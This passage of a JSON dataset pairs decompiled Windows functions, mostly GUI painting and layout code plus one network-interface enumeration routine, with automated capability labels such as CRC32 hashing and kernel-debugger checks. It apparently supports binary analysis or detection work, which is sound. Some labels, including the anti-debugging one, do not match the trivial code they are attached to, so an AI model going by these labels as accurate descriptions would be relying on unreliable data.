        "decompiled_code": "\nvoid __cdecl fcn.00452d04(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x49163c) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x4530dc != (*0x4530d8 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x4530dc != (*0x4530e0 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.0045d1f4(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x452f67\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.0045d1f4(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x45302f\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1932
    },
    "00453c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453c38(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x453d56;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403aac();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.00453bd0();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.00457a28();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4957f8;\n    fcn.00404520();\n    fcn.004056d0();\n    fcn.0040a90c();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x453d5d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 655
    },
    "00455900": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455900(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uVar3;\n    uint uStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint var_50h;\n    int32_t nXDest;\n    int32_t nHeight;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_10h;\n    uint hgdiobj;\n    uint hdc;\n    int32_t *var_4h;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        puStack96 = 0x455957;\n        cVar1 = fcn.0042ef38();\n        if (cVar1 == '\\0') {\n            puStack96 = &fcn.00455900::var_50h;\n            uStack100 = 0x455a19;\n            uStack100 = fcn.00457a28();\n            puStack104 = 0x455a1f;\n            uVar3 = sub.user32.dll_BeginPaint();\n            puStack104 = var_3ch - nHeight;\n            iStack108 = var_40h - nXDest;\n            uStack112 = uVar3;\n            hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n            *in_FS_OFFSET = &stack0xffffff84;\n            uStack132 = 0x455a4c;\n            uStack136 = sub.gdi32.dll_CreateCompatibleDC();\n            uStack132 = hgdiobj;\n            puStack140 = 0x455a5c;\n            hdc = uStack136;\n            var_10h = sub.gdi32.dll_SelectObject();\n            uStack144 = 0x455ae9;\n            uStack148 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff6c;\n            puStack140 = &stack0xfffffffc;\n            sub.gdi32.dll_SetWindowOrgEx(hdc, nXDest, nHeight, 0);\n            fcn.00450f7c(hdc);\n            *(param_2 + 4) = hdc;\n            fcn.00455900();\n            *(param_2 + 4) = 0;\n            sub.gdi32.dll_BitBlt\n                      (uVar3, nXDest, nHeight, var_40h - nXDest, var_3ch - nHeight, hdc, nXDest, nHeight, 0xcc0020);\n            *in_FS_OFFSET = uVar3;\n            sub.gdi32.dll_SelectObject(hdc, var_10h, 0x455af0);\n            return;\n        }\n        puStack96 = &fcn.00455900::var_50h;\n        uStack100 = 0x45596b;\n        uStack100 = fcn.00457a28();\n        puStack104 = 0x455971;\n        sub.user32.dll_BeginPaint();\n        iStack108 = 0x455a06;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        fcn.0042e2fc(&fcn.00455900::hdc, 0);\n        fcn.00450f7c(hdc);\n        uVar3 = 4;\n        uStack132 = 0x4559be;\n        fcn.00450f7c(4);\n        uStack132 = 0x4559cc;\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uStack132 = 0x4559dc;\n            fcn.0042e3f4();\n        }\n        uStack132 = 0x4559e6;\n        fcn.0042e388();\n        *in_FS_OFFSET = uVar3;\n        fcn.00457a28();\n        uStack132 = 0x455a05;\n        sub.user32.dll_EndPaint();\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        puStack96 = 0x455930;\n        var_4h = in_EAX;\n        iVar2 = fcn.00453b18();\n        if (iVar2 == 0) {\n            puStack96 = 0x45593e;\n            (**(*var_4h + -0x10))();\n            return;\n        }\n    }\n    puStack96 = 0x45594d;\n    fcn.00455180();\n    return;\n}\n",
        "token_count": 1080
    },
    "00455e24": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455e24(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x455e74 == (*0x455e70 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.004519c0();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 184
    },
    "00455e78": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00455e78(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00457d40();\n    fcn.0045285c();\n    (**(*in_EAX + -0x10))();\n    fcn.0045365c();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00456a4c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00456a4c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00453b18(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00453adc();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.00450f7c(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00456a4c(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 306
    },
    "004587ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004587ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    (**(*in_EAX + -0x10))();\n    piVar1 = *(param_2 + 8);\n    sub.user32.dll_InflateRect(piVar1, -in_EAX[0x67], -in_EAX[0x67]);\n    if (*(in_EAX + 0x195) != '\\0') {\n        iVar2 = 0;\n        if (*(in_EAX + 0x193) != '\\0') {\n            iVar2 = in_EAX[0x66];\n        }\n        if (*(in_EAX + 0x65) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x66];\n        }\n        if ((*(in_EAX + 0x192) & 1) != 0) {\n            *piVar1 = *piVar1 + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 2) != 0) {\n            piVar1[1] = piVar1[1] + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 4) != 0) {\n            piVar1[2] = piVar1[2] - iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 8) != 0) {\n            piVar1[3] = piVar1[3] - iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "0045887c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045887c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x458b41;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x458b49;\n        cVar3 = fcn.00431e9c();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x458b5b;\n            fcn.00431640();\n            uStack80 = 0x458b65;\n            fcn.00431d14();\n        }\n        return;\n    }\n    uStack80 = 0x4588af;\n    uStack80 = fcn.00457a28();\n    puStack84 = 0x4588b5;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x458b2f;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.00457a28(&fcn.0045887c::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.00457a28(&fcn.0045887c::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.00457a28(&fcn.0045887c::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.0045887c::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.0045887c::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.00457a28(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x492750)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x492750)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.0045887c::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x491700) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x491710), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x491720) | *(*(var_4h + 0x1d9) * 4 + 0x491730) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.0045887c::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.0045887c::nLeftRect);\n        uVar4 = fcn.00457a28(&fcn.0045887c::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.0045887c::lprcSrc1, &fcn.0045887c::lprcSrc1, &fcn.0045887c::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.0045887c::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00424860();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.0045887c::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.00457a28(hDC, 0x458b36);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1629
    },
    "00458c30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458c30(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x458cb6;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x458c60;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x458c99;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.00455180();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x458cb6;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x458caa;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "0046d52c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046d52c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = in_EAX & 1;\n        in_EAX = in_EAX >> 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 161
    },
    "0046eebc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0046eebc(void)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff7b4;\n    int32_t iStack2096;\n    uint uStack2092;\n    uchar *puStack2088;\n    uint uStack2084;\n    uint uStack2080;\n    uint uStack2076;\n    uint uStack2072;\n    uint *puStack2068;\n    int32_t iStack2064;\n    uint uStack2060;\n    uchar *puStack2056;\n    uint var_7f4h;\n    uint var_7f0h;\n    uint var_7ech;\n    uint var_7e8h;\n    uint var_7e4h;\n    uint var_1ach;\n    uint in;\n    uint uStack424;\n    uint uStack420;\n    uint lpWSAData;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack2056 = &stack0xfffffffc;\n    uStack2060 = 0x46f164;\n    iStack2064 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff7f0;\n    puStack2068 = 0x46eef5;\n    fcn.0040546c();\n    puStack2068 = &fcn.0046eebc::lpWSAData;\n    uStack2072 = 0x101;\n    uStack2076 = 0x46ef06;\n    sub.wsock32.dll_WSAStartup();\n    uStack2076 = 0;\n    uStack2080 = 1;\n    uStack2084 = 2;\n    puStack2088 = 0x46ef11;\n    iVar2 = sub.wsock32.dll_socket();\n    s = iVar2;\n    if (iVar2 != -1) {\n        uStack2092 = 0x46f12c;\n        iStack2096 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff7d0;\n        puStack2088 = &stack0xfffffffc;\n        iVar3 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar2, 0x4004747f, 0, 0, &fcn.0046eebc::var_7e8h, 0x400, &fcn.0046eebc::var_8h, 0, 0);\n        if ((iVar3 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar4 = &fcn.0046eebc::var_7e4h;\n            do {\n                var_1ach = *puVar4;\n                in = puVar4[1];\n                uStack424 = puVar4[2];\n                uStack420 = puVar4[3];\n                sub.wsock32.dll_inet_ntoa(puVar4[1]);\n                fcn.00405664(0x46f17c, *in_EAX);\n                fcn.00405800(0x46f18c, 0);\n                var_1ach = puVar4[0xc];\n                in = puVar4[0xd];\n                uStack424 = puVar4[0xe];\n                uStack420 = puVar4[0xf];\n                sub.wsock32.dll_inet_ntoa(puVar4[0xd]);\n                fcn.00405664(0x46f198, *in_EAX);\n                fcn.00405800(0x46f18c, 0);\n                var_1ach = puVar4[6];\n                in = puVar4[7];\n                uStack424 = puVar4[8];\n                uStack420 = puVar4[9];\n                sub.wsock32.dll_inet_ntoa(puVar4[7]);\n                fcn.00405664(0x46f1ac, *in_EAX);\n                fcn.00405800(0x46f18c, 0);\n                uVar1 = puVar4[-1];\n                if ((uVar1 & 1) == 1) {\n                    fcn.00405800(0x46f18c, 0x46f1cc, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x46f18c, 0x46f1e4, *in_EAX);\n                }\n                if ((uVar1 & 2) == 2) {\n                    fcn.00405800(0x46f18c, 0x46f1fc, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x46f18c, 0x46f218, *in_EAX);\n                }\n                if ((uVar1 & 4) == 4) {\n                    fcn.00405800(0x46f18c, 0x46f234, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x46f18c, 0x46f250, *in_EAX);\n                }\n                iVar2 = 0x46f18c;\n                fcn.00405800();\n                puVar4 = puVar4 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar2;\n        in_stack_fffff7b4 = s;\n        sub.wsock32.dll_closesocket();\n        sub.wsock32.dll_WSACleanup();\n    }\n    *in_FS_OFFSET = in_stack_fffff7b4;\n    fcn.00405490(0x46f16b);\n    return;\n}\n",
        "token_count": 1310
    },
    "00472f6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_12ch\n// WARNING: Variable defined which should be unmapped: var_290h\n// WARNING: Variable defined which should be unmapped: var_6dch\n// WARNING: Variable defined which should be unmapped: var_8ech\n// WARNING: Variable defined which should be unmapped: var_8e8h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00472f6c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t **in_FS_OFFSET;\n    uchar uVar10;\n    bool bVar11;\n    unkbyte10 Var12;\n    int32_t *in_stack_fffff2a4;\n    int32_t *piStack3388;\n    uchar *puStack3384;\n    uchar *puStack3380;\n    uint *puStack3376;\n    uint uStack3372;\n    uint uStack3368;\n    uint uStack3364;\n    code *pcStack3360;\n    int32_t *piStack3356;\n    int32_t *piStack3352;\n    int32_t *piStack3348;\n    uint *puStack3344;\n    int32_t *piStack3340;\n    int32_t *piStack3336;\n    uint uStack3332;\n    uchar *puStack3328;\n    uint *puStack3324;\n    uint *puStack3320;\n    uchar *puStack3316;\n    int32_t *piStack3312;\n    int32_t *piStack3308;\n    uchar *puStack3304;\n    uchar *puStack3300;\n    uchar *puStack3296;\n    uint *puStack3292;\n    uint *puStack3288;\n    uchar *puStack3284;\n    uint uStack3280;\n    uint uStack3276;\n    uint uStack3272;\n    uint *puStack3268;\n    uint uStack3264;\n    uint uStack3260;\n    uchar *puStack3256;\n    uchar *puStack3252;\n    uint uStack3248;\n    uint uStack3244;\n    code *pcStack3240;\n    uint uStack3236;\n    uint uStack3232;\n    uint uStack3228;\n    uchar *puStack3224;\n    uint uStack3220;\n    uint uStack3216;\n    code *pcStack3212;\n    uint uStack3208;\n    uint uStack3204;\n    uint uStack3200;\n    uchar *puStack3196;\n    uint uStack3192;\n    uint uStack3188;\n    code *pcStack3184;\n    uint uStack3180;\n    uint uStack3176;\n    int32_t *piStack3172;\n    int32_t *piStack3168;\n    int32_t *piStack3164;\n    uchar *puStack3160;\n    code *pcStack3156;\n    uint uStack3152;\n    int32_t *piStack3148;\n    uint uStack3144;\n    int32_t *piStack3140;\n    uint uStack3136;\n    uint *puStack3132;\n    int32_t *piStack3128;\n    uint uStack3124;\n    uint uStack3120;\n    int32_t *piStack3116;\n    int32_t *piStack3112;\n    int32_t *piStack3108;\n    uchar *puStack3104;\n    uchar *puStack3100;\n    code *pcStack3096;\n    uint *puStack3092;\n    uint uStack3088;\n    uint *puStack3084;\n    uint uStack3080;\n    uint uStack3076;\n    uint uStack3072;\n    uint uStack3068;\n    uint uStack3064;\n    uint uStack3060;\n    uint *puStack3056;\n    uint *puStack3052;\n    code *pcStack3048;\n    int32_t *piStack3044;\n    uchar *puStack3040;\n    uchar *puStack3036;\n    uint uStack3032;\n    uint uStack3028;\n    uint uStack3024;\n    int32_t *piStack3020;\n    uint uStack3016;\n    uchar *puStack3012;\n    int32_t *piStack3008;\n    uint uStack3004;\n    uint *puStack3000;\n    int32_t *piStack2996;\n    int32_t *piStack2992;\n    uchar *puStack2988;\n    uchar *puStack2984;\n    uint uStack2980;\n    uint uStack2976;\n    uint uStack2972;\n    int32_t *piStack2968;\n    uint uStack2964;\n    uint uStack2960;\n    int32_t *piStack2956;\n    uint uStack2952;\n    int32_t 